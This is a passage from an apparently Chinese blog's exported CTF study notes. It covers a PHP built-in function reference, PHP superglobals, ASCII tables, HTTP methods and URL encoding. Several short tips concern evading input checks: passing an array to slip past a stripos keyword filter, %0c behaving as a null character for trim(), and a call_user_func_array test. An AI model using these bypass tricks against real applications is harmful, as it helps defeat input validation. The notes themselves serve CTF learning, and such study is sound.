**$needle**：要查找的字符串（或字符）。\n- **$offset**：可选的参数，指定从哪个位置开始搜索。\n\n- 如果找到了字符，`strpos()` 会返回字符首次出现的位置（从 `0` 开始计数）。\n\n## highlight_file()函数\n\n`highlight_file()` 函数是 PHP 中的一个内置函数，用于高亮显示指定文件的 PHP 代码。\n\n基础语法\n\n```php\nhighlight_file(string $filename, bool $return = false): string|bool\n```\n\n- **`$filename`**: 必需，指定要高亮显示的文件名（包括路径）。\n- **`$return`**: 可选，布尔值，默认为 `false`。若设置为 `true`，函数将返回高亮后的代码，而不是直接输出。\n\n返回值\n\n- 如果 `$return` 参数为 `false`，函数将直接输出高亮的 HTML 代码。\n- 如果 `$return` 参数为 `true`，函数将返回高亮后的代码字符串；如果发生错误（例如文件不存在），则返回 `false`。\n\n示例\n\n```php\n// 示例 1: 直接输出文件高亮代码\nhighlight_file('path/to/your/file.php');\n\n// 示例 2: 返回高亮代码为字符串\n$highlightedCode = highlight_file('path/to/your/file.php', true);\necho $highlightedCode; // 输出高亮的代码，作为字符串\n```\n\n## rand()函数\n\n`rand()` 函数是 PHP 中用于生成随机整数的内置函数。它可以生成指定范围内的随机整数，用于模拟随机性、测试和其他需要随机数的应用场景。\n\n基础语法\n\n```php\nrand(int $min, int $max): int\n```\n\n- **`$min`**: 必需，指定随机数的最小值。\n- **`$max`**: 必需，指定随机数的最大值。\n\n返回值\n\n- 返回一个介于 `$min` 和 `$max` 之间的随机整数，包括 `$min` 和 `$max`。\n\n示例\n\n```php\n// 示例 1: 生成 1 到 100 之间的随机整数\n$randomNumber = rand(1, 100);\necho $randomNumber; // 输出介于 1 到 100 之间的随机整数\n\n// 示例 2: 生成 0 到 10 之间的随机整数\n$randomNumber = rand(0, 10);\necho $randomNumber; // 输出介于 0 到 10 之间的随机整数\n```\n\n## array_push()函数\n\n`array_push()` 函数用于向数组的末尾添加一个或多个元素。\n\n基础语法\n\n```php\narray_push(array &$array, mixed $value1, mixed $value2, ...): int\n```\n\n- **`$array`**: 必需，要添加元素的目标数组。\n- **`$value1`, `$value2`, ...**: 可选，要添加到数组末尾的一个或多个元素。\n\n返回值\n\n- 返回添加新元素后数组的新长度。\n\n示例\n\n```php\n// 示例 1: 向数组末尾添加单个元素\n$fruits = array(\"apple\", \"banana\");\n$newLength = array_push($fruits, \"orange\");\nprint_r($fruits); // 输出: Array ( [0] => apple [1] => banana [2] => orange )\necho $newLength; // 输出: 3\n\n// 示例 2: 向数组末尾添加多个元素\n$colors = array(\"red\", \"green\");\n$newLength = array_push($colors, \"blue\", \"yellow\");\nprint_r($colors); // 输出: Array ( [0] => red [1] => green [2] => blue [3] => yellow )\necho $newLength; // 输出: 4\n```\n\n## in_array() 函数\n\n`in_array()` 函数是 PHP 中用于检查一个值是否存在于数组中的内置函数。\n\n基础语法\n\n```php\nin_array(mixed $needle, array $haystack, bool $strict = false): bool\n```\n\n- **`$needle`**: 必需，待检查的值。\n- **`$haystack`**: 必需，要搜索的数组。\n- **`$strict`**: 可选，布尔值，默认为 `false`。如果设置为 `true`，则在比较时将进行类型比较（即不仅值相等，而且类型也要相同）。\n\n返回值\n\n- 如果 `$needle` 在 `$haystack` 中存在，返回 `true`；否则返回 `false`。\n\n示例\n\n```php\n// 示例 1: 检查元素是否在数组中\n$fruits = array(\"apple\", \"banana\", \"orange\");\n$result = in_array(\"banana\", $fruits);\nvar_dump($result); // 输出: bool(true)\n\n$result = in_array(\"grape\", $fruits);\nvar_dump($result); // 输出: bool(false)\n\n// 示例 2: 使用严格比较\n$numbers = array(1, 2, 3, \"3\");\n$result = in_array(3, $numbers, true); // 严格比较，类型也要相同\nvar_dump($result); // 输出: bool(true)\n\n$result = in_array(\"3\", $numbers, true); // \"3\" 是字符串，类型不匹配\nvar_dump($result); // 输出: bool(false)\n```\n\n## file_put_contents()函数\n\n`file_put_contents()` 是一个用于将数据写入文件的 PHP 函数。\n\n基础语法\n\n```php\nfile_put_contents($filename, $data, $flags, $context);\n```\n\n参数含义：\n\n- `$filename`：要写入数据的文件名。\n- `$data`：要写入文件的数据，可以是字符串、数组或者流。\n- `$flags`：可选参数，用于指定写入文件的标志。例如，`FILE_APPEND` 表示追加而不是覆盖。\n- `$context`：可选参数，包含指向流资源的上下文，通常用于改变流的行为。\n\n示例\n\n```php\n$data = \"Hello, World!\";\n$filename = \"example.txt\";\n\nif (file_put_contents($filename, $data) !== false) {\n    echo \"数据已写入文件。\";\n} else {\n    echo \"写入文件时出现错误。\";\n}\n```\n\n## is_numeric()函数\n\n`is_numeric()` 是一个 PHP 函数，用于检查一个变量是否是一个数字或数字字符串。它的主要作用是判断给定的变量是否是数字或数字字符串，返回布尔值 true 或 false。\n\n示例用法\n\n```php\n<?php\n// 示例 1: 整数\n$var1 = 123;\necho is_numeric($var1) ? 'true' : 'false'; // 输出: true\n// 示例 2: 浮点数\n$var2 = 123.45;\necho is_numeric($var2) ? 'true' : 'false'; // 输出: true\n// 示例 3: 数字字符串\n$var3 = \"123\";\necho is_numeric($var3) ? 'true' : 'false'; // 输出: true\n```\n\n## call_user_func()函数\n\n`call_user_func()` 是一个 PHP 函数，用于调用回调函数。它的作用是动态地调用一个回调函数，并传入指定的参数。\n\n基础语法\n\n```php\ncall_user_func($callback [, $parameter1 [, $parameter2, ...]]);\n```\n\n- `$callback`：回调函数，可以是一个包含函数名的字符串，或者是一个包含对象和方法名的数组。\n- `$parameter1`, `$parameter2`, ...：要传递给回调函数的参数，可以有多个参数。\n\n示例\n\n```php\nfunction sayHello($name) {\n    echo \"Hello, $name!\";\n}\n$callback = 'sayHello';\ncall_user_func($callback, 'Alice');\n```\n\n在这个示例中，`sayHello()` 函数接受一个参数 `$name`，然后通过 `call_user_func()` 函数动态地调用 `sayHello()` 函数，并传递参数 `'Alice'`，最终输出 `Hello, Alice!`。\n\n## call_user_func_array函数\n\n![image-20250523140833824](../image/achieve/202411/sql注入--ctfshow/image-20250523140833824.png)\n\n本地测试一下\n\n```php\n<?php\nclass test{\n    public function test(){\n        phpinfo();\n    }\n}\n//$a = new test();\n//$a->test();\ncall_user_func_array(phpinfo,array());\n```\n\n当然如果是调用类中的方法可以将第一个参数设置为数组\n\n```php\n<?php\nclass test{\n    public function test(){\n        phpinfo();\n    }\n}\n//$a = new test();\n//$a->test();\ncall_user_func_array(array(new test(),'test'),array());\n//成功执行\n```\n\n## hex2bin()函数\n\n`hex2bin()` 是一个 PHP 函数，用于将十六进制字符串转换为二进制字符串。它的作用是将表示十六进制数据的字符串转换为其对应的二进制数据。\n\n基础语法\n\n```php\nhex2bin($hex_string);\n```\n\n- `$hex_string`：要转换的十六进制字符串。\n\n示例\n\n```php\n$hex_string = '48656c6c6f20576f726c64'; // 十六进制字符串 \"Hello World\"\n$binary_string = hex2bin($hex_string);\n\necho $binary_string; // 输出：Hello World\n```\n\n## sha1()函数\n\n`sha1()` 是一个PHP函数，用于计算字符串的 SHA-1 哈希值。\n\n基础语法\n\n```php\nsha1($str, $raw_output = false);\n```\n\n- `$str`：要计算哈希值的字符串。\n- `$raw_output`：可选参数，设置为 true 时返回长度为20字节的原始二进制数据，设置为 false（默认）时返回长度为40字符的十六进制数据。\n\n示例\n\n```php\n$str = 'Hello, World!';\n$sha1_hash = sha1($str);\n\necho $sha1_hash; // 输出：2ef7bde608ce5404e97d5f042f95f89f1c232871\n```\n\n## foreach()函数\n\n`foreach()` 是 PHP 中用于遍历数组或对象的循环结构。它提供了一种简洁且方便的方式来遍历集合中的每个元素，并执行相应的操作。\n\n基础语法\n\n```php\nforeach ($array as $value) {\n    // 在每次迭代中操作 $value\n}\n```\n\n示例用法\n\n```php\n$fruits = array('apple', 'banana', 'cherry');\n\nforeach ($fruits as $fruit) {\n    echo $fruit . ' ';\n}\n// 输出：apple banana cherry\n```\n\n## parse_str()函数\n\n在 PHP 中，`parse_str()` 是一个用于解析查询字符串并将其转换为变量数组的函数\n\nparse_str()函数的基本语法\n\n```php\nparse_str(string $string, array &$array = null): void\n```\n\n- **`$string`**：要解析的查询字符串。\n- **`$array`**（可选）：如果提供，则解析后的变量会被存储在这个数组中。否则，解析后的变量会直接导入到当前的符号表（即可以直接使用变量名）。\n\n## strrev()函数\n\n`strrev()` 是 PHP 中的一个字符串函数，用于将字符串进行反转操作，即将字符串中的字符顺序逆转。\n\n基础语法\n\n```php\nstrrev($string);\n```\n\n- `$string`：要进行反转操作的字符串。\n\n示例用法\n\n```php\n$str = 'Hello, World!';\n$reversed_str = strrev($str);\n\necho $reversed_str; // 输出：!dlroW ,olleH\n```\n\n## getcwd()函数\n\n`getcwd()`函数是PHP中的一个内置函数，用于获取当前工作目录的路径。\n\n语法:\n\n```php\nstring getcwd(void**)\n```\n\n具体用法:\n\n```php\n$currentDir = getcwd();\necho \"当前工作目录是：$currentDir\";\n```\n\n## is_file()函数\n\nis_file()` 函数用于判断给定的路径是否是一个文件，如果是则返回 `true`，否则返回 `false\n\n基础语法\n\n```php\nis_file($path);\n```\n\n- `$path`：要检测的文件路径。\n\n示例用法\n\n```php\n$file_path = 'example.txt';\n\nif (is_file($file_path)) {\n    echo '文件存在！';\n} else {\n    echo '文件不存在！';\n}\n```\n\n在这个示例中，`is_file()` 函数用于检查名为 `example.txt` 的文件是否存在，然后根据返回值输出相应的信息。\n\n## str_replace()函数\n\n`str_replace()` 是 PHP 中的一个字符串替换函数，用于在一个字符串中将指定的子字符串替换为另一个子字符串\n\n基本语法:\n\n```php\nstr_replace($search, $replace, $subject, $count);\n```\n\n参数说明：\n\n- `$search`：要查找和替换的子字符串，可以是一个字符串或字符串数组。\n- `$replace`：用于替换的字符串或字符串数组，可以与 `$search` 长度相同，也可以是一个字符串。\n- `$subject`：要进行替换操作的字符串或字符串数组。\n- `$count` (可选)：用于接收替换的次数。\n\n示例\n\n```php\n$str = \"Hello, World!\";\n$new_str = str_replace(\"World\", \"PHP\", $str);\n\necho $new_str; // 输出：Hello, PHP!\n```\n\n## trim()函数\n\n`trim()` 函数是 PHP 中用于去除字符串首尾空白字符的函数\n\n基础语法\n\n```php\ntrim($str, $charlist)\n```\n\n参数说明：\n\n- `$str`：要处理的字符串。\n\n- `$charlist`（可选）：指定要删除的字符列表。如果未指定该参数，trim() 将去除这些字符：\n\n  \" \" (ASCII 32 (0x20))，普通空格符。\n  \"\\t\" (ASCII 9 (0x09))，制表符。\n  \"\\n\" (ASCII 10 (0x0A))，换行符。\n  \"\\r\" (ASCII 13 (0x0D))，回车符。\n  \"\\0\" (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符\n  \"\\x0B\" (ASCII 11 (0x0B))，垂直制表符\n\n`trim()` 函数执行以下操作：\n\n- 删除 `$str` 字符串开头和结尾的空白字符或指定的字符列表。\n- 返回处理后的字符串。\n\n## get_defined_vars()函数\n\n`get_defined_vars()` 是 PHP 的一个内置函数，它用于返回当前作用域中所有已定义变量的关联数组,这个函数非常有用，特别是在调试过程中，因为它可以让开发者查看当前作用域内的所有变量及其值。\n\n基础用法\n\n```php\nget_defined_vars() 函数没有参数，直接调用即可。\n```\n\n返回值\n\n`get_defined_vars()` 返回一个关联数组，数组的键是变量名，值是对应的变量值。\n\n## stripos()函数\n\n`stripos()` 是 PHP 的一个内置函数，用于在一个字符串中查找另一个字符串的首次出现位置，比较时不区分大小写\n\n基础语法\n\n```php\nint stripos(string $haystack, string $needle, int $offset = 0)\n```\n\n参数\n\n**$haystack**: 要搜索的目标字符串。\n\n**$needle**: 要查找的子字符串。\n\n**$offset**: 可选参数，指定从哪个位置开始搜索。默认值是 0。\n\n返回值\n\n- 如果找到 `$needle`，则返回 `$needle` 在 `$haystack` 中首次出现的位置（以 0 为起始索引）。\n- 如果未找到，返回 `FALSE`。\n\n### 绕过stripos\n\n例如\n\n```\nif (stripos($purpose, \"rce\") === false)\n```\n\n这里可以采用数组绕过的方式，stripos处理数组的时候会返回null，null=false，可以满足tiao'j\n\n## readfile()函数\n\n`readfile()` 是 PHP 的一个内置函数，用于读取文件并将其内容发送到输出缓冲区\n\n基础语法\n\n```php\nint readfile(string $filename, bool $use_include_path = false, resource $context = null)\n```\n\n参数\n\n- **$filename**: 要读取的文件的路径（可以是相对路径或绝对路径）。\n- **$use_include_path**: 可选参数，表示是否在包括路径中查找文件。默认为 `false`。\n- **$context**: 可选参数，指定一个上下文资源，用于修改文件的读取行为（例如，设置流选项）。\n\n返回值\n\n- 返回读取的字节数，或者在出错时返回 `false`。\n\n## mt_rand()函数\n\n`mt_rand()` 是 PHP 中的一个随机数生成函数，用于生成伪随机整数。\n\n函数语法:\n\n```php\nint mt_rand(int $min = 0, int $max = MT_RAND_MAX);\n```\n\n参数说明\n\n- **`$min`**: （可选）生成的随机数的最小值，默认为 `0`。\n- **`$max`**: （可选）生成的随机数的最大值，默认为 `MT_RAND_MAX`，通常是 `2147483647`（即 PHP 中 `mt_rand` 的最大返回值）。\n\n返回值\n\n- 返回一个介于 `$min` 和 `$max` 之间的伪随机整数（包括 `$min` 和 `$max`）。\n\n## mt_srand()函数\n\n`mt_srand()` 是 PHP 中用于设置 Mersenne Twister 随机数生成器的种子（seed）的函数。\n\n基础语法\n\n```php\nvoid mt_srand(int $seed = 0)\n```\n\n参数\n\n- **`$seed`** (可选)：指定一个整数作为随机数生成器的种子。如果不提供，默认为 0。使用相同的种子值将导致后续生成相同的随机数序列。\n\n返回值\n\n`mt_srand()` 没有返回值，它仅仅是设置了随机数生成器的种子。\n\n## exec()函数\n\n`exec()` 是 PHP 中用于执行外部命令或程序的函数。\n\n基础语法\n\n```php\nexec(command, output, return_var);\n```\n\n- `command`：要执行的外部命令。\n- `output`：用于存储命令输出的数组（可选）。\n- `return_var`：用于存储命令执行返回的状态码（可选）。\n\n## strripos()函数\n\n`strripos()` 是 PHP 中的一个函数，用于查找字符串在另一个字符串中最后一次出现的位置（不区分大小写）。\n\n基础语法\n\n```php\nstrripos($haystack, $needle, $offset);\n```\n\n- `$haystack`：要在其中查找的字符串。\n- `$needle`：要查找的子字符串。\n- `$offset`（可选）：可选参数，指定从哪个位置开始搜索。\n\n返回值\n\n返回字符串最后一次出现的位置的索引，如果未找到则返回 `false`。\n\n示例\n\n```php\n$string = 'Hello, World! This is a PHP example.';\n$substring = 'php';\n$position = strripos($string, $substring);\n\nif ($position !== false) {\n    echo \"The substring '$substring' was found at position $position.\";\n} else {\n    echo \"The substring '$substring' was not found.\";\n}\n```\n\n## sleep()函数\n\n`sleep()` 是 PHP 中用于让脚本暂停执行一定时间的函数\n\n基础语法\n\n```php\nsleep(seconds);\n```\n\n- `seconds`：要暂停的秒数，可以是整数或浮点数。\n\n示例用法\n\n```php\necho \"Start time: \" . date('H:i:s') . \"<br>\";\nsleep(5); // 暂停 5 秒\necho \"End time: \" . date('H:i:s');\n```\n\n## create_funtion()函数\n\n在 PHP 中，`create_function()` 函数用于创建一个匿名函数（Anonymous functions）。\n\n基础语法\n\n```php\ncreate_function($args, $code);\n```\n\n- `$args`：是一个逗号分隔的参数列表，如 `'arg1, arg2, ...'`。\n- `$code`：是一个包含函数主体代码的字符串。\n\n示例\n\n```php\n$myFunction = create_function('$a, $b', 'return $a + $b;');\necho $myFunction(2, 3); // 输出：5\n```\n\n## hash()函数\n\n在 PHP 中，`hash()` 函数用于生成各种散列（哈希）值。\n\n基础语法\n\n```php\nhash(string $algo, string $data, bool $binary = false): string\n```\n\n- **$algo**：指定使用的算法，例如 `'sha256'`、`'md5'` 等。可以通过 `hash_algos()` 函数获取支持的算法列表。\n- **$data**：要进行哈希处理的输入数据。\n- **$binary**（可选）：如果设置为 `true`，则返回原始的二进制格式哈希值；默认 `false`，返回16进制格式的字符串。\n\n## extract()函数\n\n`extract()` 函数在 PHP 中用于从数组中将变量导入到当前的符号表中。换句话说，它可以将数组中的键值对转换为变量名及其对应的值。\n\n语法\n\n```php\nextract(array &$array, int $flags = EXTR_OVERWRITE, string $prefix = \"\"): int\n```\n\n- 参数\n\n  - `array`\n\n    一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量，并受到 `flags` 和 `prefix` 参数的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了 **`EXTR_PREFIX_ALL`** 或者 **`EXTR_PREFIX_INVALID`**。\n\n  - `flags`\n\n    对待非法／数字和冲突的键名的方法将根据取出标记 `flags` 参数决定。可以是以下值之一：**`EXTR_OVERWRITE`**如果有冲突，覆盖已有的变量。**`EXTR_SKIP`**如果有冲突，不覆盖已有的变量。**`EXTR_PREFIX_SAME`**如果有冲突，在变量名前加上前缀 `prefix`。**`EXTR_PREFIX_ALL`**给所有变量名加上前缀 `prefix`。**`EXTR_PREFIX_INVALID`**仅在非法／数字的变量名前加上前缀 `prefix`。**`EXTR_IF_EXISTS`**仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 举个例子，以下情况非常有用：定义一些有效变量，然后从 $_REQUEST 中仅导入这些已定义的变量。**`EXTR_PREFIX_IF_EXISTS`**仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。**`EXTR_REFS`**将变量作为引用提取。这有力地表明了导入的变量仍然引用了 `array` 参数的值。可以单独使用这个标志或者在 `flags` 中用 OR 与其它任何标志结合使用。如果没有指定 `flags`，则被假定为 **`EXTR_OVERWRITE`**。\n\n  - `prefix`\n\n    注意 `prefix` 仅在 `flags` 的值是 **`EXTR_PREFIX_SAME`**，**`EXTR_PREFIX_ALL`**，**`EXTR_PREFIX_INVALID`** 或 **`EXTR_PREFIX_IF_EXISTS`** 时需要。 如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。\n    \n    - 返回值\n\n  返回成功导入到符号表中的变量数目。\n\n## count()函数\n\ncount()函数用于统计数组、Countable 对象中所有元素的数量\n\n语法\n\n```php\ncount(Countable|array $value, int $mode = COUNT_NORMAL): int\n```\n\n用于数组时，统计数组中元素的数量；用于实现了 Countable 接口的对象时，返回 Countable::count() 方法的返回值。\n\n参数\n\n- `value`\n\n  数组或者 Countable 对象。\n\n- `mode`\n\n  如果可选的 `mode` 参数设为 **`COUNT_RECURSIVE`**（或 1），**count()** 将递归地对数组计数。对计算多维数组的所有单元尤其有用。\n\n返回值 \n\n返回 `value` 中的元素的数量。在 PHP 8.0.0 之前，如果参数既不是数组也不是实现了 `Countable` 接口的对象，将返回 `1`。当 `value` 为 **`null`** 时返回 `0`。\n\n## key()函数\n\nkey用于从关联数组中取得键名\n\n```\nkey(arrcay|object `$array`): int|string|null\n```\n\n**key()** 返回数组中当前单元的键名。\n\n## spl_autoload_extensions()函数\n\nspl_autoload_extensions — 注册并返回 spl_autoload 的默认文件扩展名\n\n![image-20250203111521812](../image/achieve/202411/新春欢乐赛/image-20250203111521812-1738552523822-13.png)\n\n![image-20250203111338722](../image/achieve/202411/新春欢乐赛/image-20250203111338722-1738552421550-9.png)\n","tags":["php函数"],"categories":["知识点积累"]},{"title":"基础知识","url":"/2024/12/13/基础知识/","content":"\n# 基础知识积累\n\n## PHP九大全局变量\n\n- $_POST [用于接收post提交的数据]\n- $_GET [用于获取url地址栏的参数数据]\n- $_FILES [用于文件就收的处理img 最常见]\n- $_COOKIE [用于获取与setCookie()中的name 值]\n- $_SESSION [用于存储session的值或获取session中的值]\n- $_REQUEST [具有get,post的功能，但比较慢]\n- SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都\n- $GLOBALS [一个包含了全部变量的全局组合数组]\n- $_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]\n\n## ASCII 设备控制字符\n\nASCII 控制字符（00-31，加上 127）最初被设计用来控制诸如打印机和磁带驱动器之类的硬件设备。\n\n控制字符（除了水平制表符、换行、回车之外）在 HTML 文档中不起任何作用。\n\n| 字符 | 编号 | 描述                                       |\n| :--- | :--- | :----------------------------------------- |\n| NUL  | 00   | 空字符（null character）                   |\n| SOH  | 01   | 标题开始（start of header）                |\n| STX  | 02   | 正文开始（start of text）                  |\n| ETX  | 03   | 正文结束（end of text）                    |\n| EOT  | 04   | 传输结束（end of transmission）            |\n| ENQ  | 05   | 请求（enquiry）                            |\n| ACK  | 06   | 收到通知/响应（acknowledge）               |\n| BEL  | 07   | 响铃（bell）                               |\n| BS   | 08   | 退格（backspace）                          |\n| HT   | 09   | 水平制表符（horizontal tab）               |\n| LF   | 10   | 换行（line feed）                          |\n| VT   | 11   | 垂直制表符（vertical tab）                 |\n| FF   | 12   | 换页（form feed）                          |\n| CR   | 13   | 回车（carriage return）                    |\n| SO   | 14   | 不用切换（shift out）                      |\n| SI   | 15   | 启用切换（shift in）                       |\n| DLE  | 16   | 数据链路转义（data link escape）           |\n| DC1  | 17   | 设备控制 1（device control 1）             |\n| DC2  | 18   | 设备控制 2（device control 2）             |\n| DC3  | 19   | 设备控制 3（device control 3）             |\n| DC4  | 20   | 设备控制 4（device control 4）             |\n| NAK  | 21   | 拒绝接收/无响应（negative acknowledge）    |\n| SYN  | 22   | 同步空闲（synchronize）                    |\n| ETB  | 23   | 传输块结束（end transmission block）       |\n| CAN  | 24   | 取消（cancel）                             |\n| EM   | 25   | 已到介质末端/介质存储已满（end of medium） |\n| SUB  | 26   | 替补/替换（substitute）                    |\n| ESC  | 27   | 溢出/逃离/取消（escape）                   |\n| FS   | 28   | 文件分隔符（file separator）               |\n| GS   | 29   | 组分隔符（group separator）                |\n| RS   | 30   | 记录分隔符（record separator）             |\n| US   | 31   | 单元分隔符（unit separator）               |\n|      |      |                                            |\n| DEL  | 127  | 删除（delete）                             |\n\n## ASCII 可打印的字符\n\n| 字符 | 编号 | 描述                             |\n| :--- | :--- | :------------------------------- |\n|      | 32   | 空格（space）                    |\n| !    | 33   | 感叹号（exclamation mark）       |\n| \"    | 34   | 引号（quotation mark）           |\n| #    | 35   | 数字符号（number sign）          |\n| $    | 36   | 美元符号（dollar sign）          |\n| %    | 37   | 百分比符号（percent sign）       |\n| &    | 38   | & 符号（ampersand）              |\n| '    | 39   | 撇号（apostrophe）               |\n| (    | 40   | 左括号（left parenthesis）       |\n| )    | 41   | 右括号（right parenthesis）      |\n| *    | 42   | 星号（asterisk）                 |\n| +    | 43   | 加号（plus sign）                |\n| ,    | 44   | 逗号（comma）                    |\n| -    | 45   | 连字符（hyphen）                 |\n| .    | 46   | 句号（period）                   |\n| /    | 47   | 斜线（slash）                    |\n| 0    | 48   | 数字 0                           |\n| 1    | 49   | 数字 1                           |\n| 2    | 50   | 数字 2                           |\n| 3    | 51   | 数字 3                           |\n| 4    | 52   | 数字 4                           |\n| 5    | 53   | 数字 5                           |\n| 6    | 54   | 数字 6                           |\n| 7    | 55   | 数字 7                           |\n| 8    | 56   | 数字 8                           |\n| 9    | 57   | 数字 9                           |\n| :    | 58   | 冒号（colon）                    |\n| ;    | 59   | 分号（semicolon）                |\n| <    | 60   | 小于号（less-than）              |\n| =    | 61   | 等于号（equals-to）              |\n| >    | 62   | 大于号（greater-than）           |\n| ?    | 63   | 问号（question mark）            |\n| @    | 64   | @ 符号（at sign）                |\n| A    | 65   | 大写字母 A                       |\n| B    | 66   | 大写字母 B                       |\n| C    | 67   | 大写字母 C                       |\n| D    | 68   | 大写字母 D                       |\n| E    | 69   | 大写字母 E                       |\n| F    | 70   | 大写字母 F                       |\n| G    | 71   | 大写字母 G                       |\n| H    | 72   | 大写字母 H                       |\n| I    | 73   | 大写字母 I                       |\n| J    | 74   | 大写字母 J                       |\n| K    | 75   | 大写字母 K                       |\n| L    | 76   | 大写字母 L                       |\n| M    | 77   | 大写字母 M                       |\n| N    | 78   | 大写字母 N                       |\n| O    | 79   | 大写字母 O                       |\n| P    | 80   | 大写字母 P                       |\n| Q    | 81   | 大写字母 Q                       |\n| R    | 82   | 大写字母 R                       |\n| S    | 83   | 大写字母 S                       |\n| T    | 84   | 大写字母 T                       |\n| U    | 85   | 大写字母 U                       |\n| V    | 86   | 大写字母 V                       |\n| W    | 87   | 大写字母 W                       |\n| X    | 88   | 大写字母 X                       |\n| Y    | 89   | 大写字母 Y                       |\n| Z    | 90   | 大写字母 Z                       |\n| [    | 91   | 左方括号（left square bracket）  |\n| \\    | 92   | 反斜线（backslash）              |\n| ]    | 93   | 右方括号（right square bracket） |\n| ^    | 94   | 插入符号（caret）                |\n| _    | 95   | 下划线（underscore）             |\n| `    | 96   | 重音符（grave accent）           |\n| a    | 97   | 小写字母 a                       |\n| b    | 98   | 小写字母 b                       |\n| c    | 99   | 小写字母 c                       |\n| d    | 100  | 小写字母 d                       |\n| e    | 101  | 小写字母 e                       |\n| f    | 102  | 小写字母 f                       |\n| g    | 103  | 小写字母 g                       |\n| h    | 104  | 小写字母 h                       |\n| i    | 105  | 小写字母 i                       |\n| j    | 106  | 小写字母 j                       |\n| k    | 107  | 小写字母 k                       |\n| l    | 108  | 小写字母 l                       |\n| m    | 109  | 小写字母 m                       |\n| n    | 110  | 小写字母 n                       |\n| o    | 111  | 小写字母 o                       |\n| p    | 112  | 小写字母 p                       |\n| q    | 113  | 小写字母 q                       |\n| r    | 114  | 小写字母 r                       |\n| s    | 115  | 小写字母 s                       |\n| t    | 116  | 小写字母 t                       |\n| u    | 117  | 小写字母 u                       |\n| v    | 118  | 小写字母 v                       |\n| w    | 119  | 小写字母 w                       |\n| x    | 120  | 小写字母 x                       |\n| y    | 121  | 小写字母 y                       |\n| z    | 122  | 小写字母 z                       |\n| {    | 123  | 左花括号（left curly brace）     |\n| \\|   | 124  | 竖线（vertical bar）             |\n| }    | 125  | 右花括号（right curly brace）    |\n| ~    | 126  | 波浪线（tilde）                  |\n\n## HTTP协议\n\n### HTTP协议分类\n\n- HTTP1.0\n\n对应服务器端口：80\n\n**特点**：\n\n1. 支持 GET、POST、HEAD 方法。\n2. 引入了头部（Headers）、状态码（Status Codes）和内容类型（Content-Type）。\n3. 每个请求需要建立一个新的 TCP 连接（无连接）。\n\n- HTTP1.1\n\n对应服务器端口：80\n\n**特点**：\n\n1. 支持持久连接（Keep-Alive），减少 TCP 连接的开销。\n2. 引入了管道化（Pipelining），允许在同一个连接上发送多个请求。\n3. 新增了 PUT、DELETE、OPTIONS、TRACE 等方法。\n4. 支持分块传输编码（Chunked Transfer Encoding）。\n\n但是对于HTTP协议来说，存在着安全隐患，HTTP是明文传输，数据容易被窃听或篡改。这时候另一种协议就会更安全\n\n- HTTPS\n\n对应服务器端口：443\n\n**特点**：\n\n1. 基于 TLS/SSL 加密传输，数据安全。\n\n### HTTP请求方法\n\nHTTP（超文本传输协议）是一种应用层协议，主要用于客户端和服务器之间的通信。HTTP定义了一些方法（又称为请求方法），用于指示客户端希望对服务器资源执行的操作。以下是一些常见的HTTP方法及其用途：\n\n1. GET\n\n- **用途**：请求指定资源的表示（通常是网页或文件）。\n- 特点\n  - 数据通过URL传递，适合获取数据。\n  - 不会对服务器上的资源产生副作用，即是安全的（safe）和幂等的（idempotent）。\n\n2. POST\n\n- **用途**：向指定资源提交数据（例如表单数据），通常用于创建新的资源。\n- 特点\n  - 数据包含在请求体中。\n  - 可能会对服务器上的资源产生副作用，不同的请求可能会产生不同的结果。\n\n3. PUT\n\n- **用途**：更新指定资源。如果资源不存在，则可以创建它。\n- 特点\n  - 数据包含在请求体中。\n  - 是幂等的，即多次请求结果相同。\n\n4. DELETE\n\n- **用途**：删除指定资源。\n- 特点\n  - 请求体通常为空。\n  - 是幂等的，重复请求同一资源的删除不会产生额外效果。\n\n5. HEAD\n\n- **用途**：获取指定资源的响应头，而不获取实际的资源内容。\n- 特点\n  - 常用于检查资源是否存在或获取资源的元信息。\n  - 不会对服务器上的资源产生副作用。\n\n6. OPTIONS\n\n- **用途**：描述目标资源的通信选项，通常用于跨域请求。\n- 特点\n  - 返回允许的HTTP方法和其他相关信息。\n\n7. PATCH\n\n- **用途**：对指定资源进行部分更新。\n- 特点\n  - 数据包含在请求体中，可以只修改资源的部分属性。\n  - 是非幂等的，具体结果取决于请求内容。\n\n8. TRACE\n\n- **用途**：用于诊断，回显服务器收到的请求信息。\n- 特点\n  - 主要用于调试目的。\n\n9. CONNECT\n\n- **用途**：建立一个到服务器的隧道，通常用于HTTPS请求。\n- 特点\n  - 通常在代理服务器中使用，允许客户端与目标服务器进行安全通信。\n\n### URL统一资源定位符\n\n组成结构\n\n```\n协议://主机名[:端口]/路径[?查询参数][#片段]\n```\n\n参数介绍\n\n- 协议:指定访问资源所用的协议，常见的协议包括：\n\n`http`：超文本传输协议（未加密）。\n\n`https`：安全的超文本传输协议（加密）。\n\n`ftp`：文件传输协议。\n\n`mailto`：电子邮件地址。\n\n`file`：本地文件。\n\n- 主机名：指定资源所在的主机（服务器）的名称或 IP 地址。\n\n- 端口：指定访问资源的端口号（可选）。如果未指定端口则默认http的80端口或者https的443端口\n\n- 路径：指定资源在服务器上的路径\n- 查询参数：用于向服务器传递的额外参数(可选)，以`?`开头，每个参数之间用`&`分隔\n- 片段：用于指定资源中的某个部分（如页面中的锚点）（可选）。以`#`开头\n\n一个完整的URL示例\n\n```\nhttp://www.example.com:8080/path/to/resource?key1=1&key2=2#section1\n```\n\n### url编码\n\n**URL 编码的基本规则**\n\n- **保留字符**：某些字符在 URL 中有特殊含义（如 `?`, `=`, `&`, `/`, `#` 等），称为保留字符。这些字符在特定位置不需要编码，但在其他位置需要编码。\n- **非保留字符**：字母（`a-z`, `A-Z`）、数字（`0-9`）以及 `-`, `_`, `.`, `~` 等字符不需要编码。\n- **其他字符**：所有其他字符（如空格、中文、特殊符号等）都需要编码。\n\n**编码规则**\n\nURL 编码使用 `%` 后跟两个十六进制数字表示字符的 ASCII 